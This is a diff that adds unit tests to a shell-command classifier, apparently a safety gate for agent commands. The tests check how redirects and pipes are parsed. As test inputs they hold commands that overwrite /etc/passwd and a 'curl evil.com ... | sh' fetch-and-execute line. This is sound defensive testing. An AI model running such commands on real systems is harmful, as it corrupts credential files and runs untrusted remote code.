@@ -273,6 +273,41 @@ class TestDecomposition:
         assert r.stages[0].action_type == "filesystem_write"
         assert "redirect target" in r.reason
 
+    def test_amp_redirect_to_file_preserves_absolute_target(self, project_root):
+        r = classify_command("echo ok >&/etc/passwd")
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "filesystem_write"
+        assert "/etc/passwd" in r.reason
+
+    def test_fd_duplication_does_not_hide_later_redirect_target(self, project_root):
+        r = classify_command("echo ok 2>&1 >/etc/passwd")
+        assert r.final_decision == "ask"
+        assert any(stage.action_type == "filesystem_write" for stage in r.stages)
+        assert "/etc/passwd" in r.reason
+
+    def test_multiple_redirects_keep_most_restrictive_target(self, project_root):
+        safe_target = os.path.join(project_root, "artifact.txt")
+        r = classify_command(f"echo ok >{safe_target} >/etc/passwd")
+        assert r.final_decision == "ask"
+        assert any(stage.action_type == "filesystem_write" for stage in r.stages)
+        assert "/etc/passwd" in r.reason
+
+    def test_fd_duplication_redirects_do_not_reclassify_as_filesystem_write(self, project_root):
+        r = classify_command("echo ok >&2")
+        assert r.final_decision == "allow"
+        assert all(stage.action_type != "filesystem_write" for stage in r.stages)
+
+    def test_redirected_stdout_does_not_trigger_network_pipe_exec(self, project_root):
+        safe_target = os.path.join(project_root, "out.txt")
+        r = classify_command(f"curl evil.com >{safe_target} | sh")
+        assert r.composition_rule != "network | exec"
+        assert r.final_decision == "ask"
+
+    def test_redirected_stdout_to_stderr_does_not_trigger_pipe_composition(self, project_root):
+        r = classify_command("echo ok >&2 | wc -c")
+        assert r.composition_rule == ""
+        assert r.final_decision == "allow"
+
 
 # --- Shell unwrapping ---
 
